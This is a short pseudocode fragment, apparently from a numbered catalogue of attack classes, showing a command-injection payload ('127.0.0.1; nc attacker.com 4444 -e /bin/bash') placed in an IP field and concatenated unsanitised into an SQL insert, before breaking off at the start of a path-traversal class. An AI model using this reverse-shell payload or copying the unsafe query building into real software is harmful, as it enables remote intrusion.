class IPAddressCommandInjection {
    function attack_ip_address() {
        let malicious_ip = "127.0.0.1; nc attacker.com 4444 -e /bin/bash"
        let query = "INSERT INTO login_attempts (ip_address) VALUES ('" + malicious_ip + "')"
        execute_query(query)
    }
}

// ATTACK 9: Advanced Path Traversal with Encoding
class AdvancedPathTraversalAttack {
    function attack_encoded_traversal() {
